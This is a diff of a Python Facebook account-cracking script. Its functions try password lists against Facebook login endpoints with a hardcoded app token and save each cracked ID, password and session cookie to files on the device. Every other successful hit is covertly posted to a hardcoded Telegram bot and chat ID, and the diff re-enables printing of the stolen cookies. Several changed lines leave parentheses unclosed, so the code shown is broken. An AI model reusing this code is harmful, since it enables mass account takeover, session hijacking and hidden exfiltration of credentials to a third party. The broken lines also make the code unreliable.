@@ -1282,7 +1282,7 @@ def mbasic(uid,pwx,tl):
     global oks
     global cps
     global bkas
-    sys.stdout.write("\r\033[1;37m [M1==SUMON] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [M1==SUMON] [%s] [%s]\r"%(loop, len(oks),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1345,7 +1345,7 @@ def mbasic(uid,pwx,tl):
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
                         print(f" {green}[ATOM--OK] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
+                        print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
                         bkas.append(uid)
@@ -1354,7 +1354,7 @@ def mbasic(uid,pwx,tl):
                             requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
                         else:  
                             print(f" {green}[ATOM-OK] {uid}|{pw}")
-                            #print(f" {green}[COOKIES] {green}{coki}")
+                            print(f" {green}[COOKIES] {green}{coki}")
                             open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                             oks.append(uid)
                             break
@@ -1368,105 +1368,92 @@ def mbasic(uid,pwx,tl):
 
 
 def p(uid,pwx,tl):
+    global loop
     global oks
     global cps
-    global twf
-    global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M2--SUMON) ({loop}) (OK-{len(oks)})\r"),
+    sys.stdout.write("\r\033[1;37m [M2==SUMON] [%s] [%s]\r"%(loop, len(oks),
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ua = random.choice(uas)
-            Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
             data = {
-            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number": 0,
-            "unrecognized_tries": 0,
-            "email": uid,
-            "prefill_contact_point": uid,
-            "prefill_source": "browser_dropdown",
-            "prefill_type": "password",
-            "first_prefill_source": "browser_dropdown",
-            "first_prefill_type": "contact_point",
-            "had_cp_prefilled": True,
-            "had_password_prefilled": True,
-            "is_smart_lock": False,
-            "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(free_fb)).group(1),
-            "bi_wvdp": {"hwc": True, "hwcr": False, "has_dnt": True, "has_standalone": False, "hasPerm": True, "has_seWo": True, "has_meDe": True, "has_creds": True, "has_hwi_bt": False, "has_agjsi": False, "iframeProto": "function get contentWindow() { [native code] }", "iframeData": {"hwc": True, "hwcr": False, "has_dnt": True, "has_standalone": False, "hasPerm": True, "has_seWo": True, "has_meDe": True, "has_creds": True, "has_hwi_bt": False, "has_agjsi": False}},
-            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            "fb_dtsg": "",
-            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "__dyn": "",
-            "__csr": "",
-            "__req": random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
-            "__fmt": 1,
-            "__a": "",
-            "__user": 0}
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'ATOMice_id': str(uuid.uuid4()),
+                'email': uid,
+                'password': pw,
+                'generate_analytics_claims': '1',
+                'community_id': '',
+                'cpl': 'true',
+                'try_num': '1',
+                'family_ATOMice_id': str(uuid.uuid4()),
+                'credentials_type': 'password',
+                'source': 'login',
+                'error_detail_type': 'button_with_disabled',
+                'enroll_misauth': 'false',
+                'generate_session_cookies': '1',
+                'generate_machine_id': '1',
+                'currently_logged_in_userid': '0',
+                'locale': 'en_GB',
+                'client_country_code': 'GB',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            }
             headers = {
-            "Host": "m.facebook.com",
-            "Connection": "keep-alive",
-            "Content-Length": "2075",
-            "Viewport-Width": "393",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
-            "X-Response-Format": "JSONStream",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-FB-LSD": "AVq8AEIGGdc",
-            "X-Requested-With": "XMLHttpRequest",
-            "X-ASBD-ID": "129477",
-            "DPR": "2.75",
-            "Accept": "*/*",
-            "Origin": "https://m.facebook.com",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Dest": "empty",
-            "Referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D274266067164%26cbt%3D1727857109841%26e2e%3D%257B%2522init%2522%253A1727857109841%257D%26ies%3D0%26sdk%3Dandroid-15.0.2%26sso%3Dchrome_custom_tab%26nonce%3De811d7a5-1c58-4736-a373-62736184ad5a%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a637c4fc-08cb-47c0-9f86-43029b0b9b37%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ppg2jh4put95ccl7tguc%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pinterest%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D47cGdAHirRSZ9MdP8XILUi0QQAmFaJso9L9EzgmLG9Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da637c4fc-08cb-47c0-9f86-43029b0b9b37%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.pinterest%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a637c4fc-08cb-47c0-9f86-43029b0b9b37%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ppg2jh4put95ccl7tguc%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Accept-Language": "en-US,en;q=0.9"}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/ATOMice-based/login/async/?api_key=274266067164&auth_token=5632b47aa47bd661d18b53714ed804a9&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D274266067164%26cbt%3D1727857109841%26e2e%3D%257B%2522init%2522%253A1727857109841%257D%26ies%3D0%26sdk%3Dandroid-15.0.2%26sso%3Dchrome_custom_tab%26nonce%3De811d7a5-1c58-4736-a373-62736184ad5a%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a637c4fc-08cb-47c0-9f86-43029b0b9b37%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ppg2jh4put95ccl7tguc%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pinterest%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D47cGdAHirRSZ9MdP8XILUi0QQAmFaJso9L9EzgmLG9Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da637c4fc-08cb-47c0-9f86-43029b0b9b37%26tp%3Dunspecified&refsrc=deprecated&app_id=274266067164&cancel=fbconnect%3A%2F%2Fcct.com.pinterest%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a637c4fc-08cb-47c0-9f86-43029b0b9b37%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ppg2jh4put95ccl7tguc%2522%257D&lwv=100"
-            po = Session.post(url, data=data, headers=headers).text
-            response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
-                cok = Session.cookies.get_dict()
-                cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                check = check_lock(cid)
-                if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
+                'User-Agent': ua(),
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'close',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-FB-Net-HNI': str(random.randint(20000,40000)),
+                'X-FB-SIM-HNI': str(random.randint(20000,40000)),
+                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'X-FB-Connection-Type': 'WIFI',
+                'X-FB-ATOMice-group': str(random.randint(2000, 4000)),
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                'x-fb-ATOMice-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
+            }
+            url = "https://graph.facebook.com/auth/login"
+            result = requests.post(url, data=data, headers=headers).json()
+            if "session_key" in result:
+                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
+                coki = f"sb={sb};{ckkk}"
+                try:
+                    uid = result["uid"]
+                except:
+                    uid = uid
+                c = check_lock(uid)
+                if "live" in c:
+                    if result["is_account_confirmed"] == False:
+                        print(f" {green}[ATOM--OK] {uid}|{pw}")
+                        print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        bkas.append(cid)
+                        bkas.append(uid)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
-                else:
-                    break
-            elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki[0:11]
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
-                cps.append(uid)
-                break
+                            statusok = (f"{uid}|{pw}|{coki}")
+                            requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                        else:  
+                            print(f" {green}[ATOM-OK] {uid}|{pw}")
+                            print(f" {green}[COOKIES] {green}{coki}")
+                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                            oks.append(uid)
+                            break
             else:
                 continue
         loop+=1
-    except ce:
-        time.sleep(20)
-    except Exception as error:
-        #print({error})
+    except net_error:
+        time.sleep(10)
+    except Exception as e:
         pass
 
 
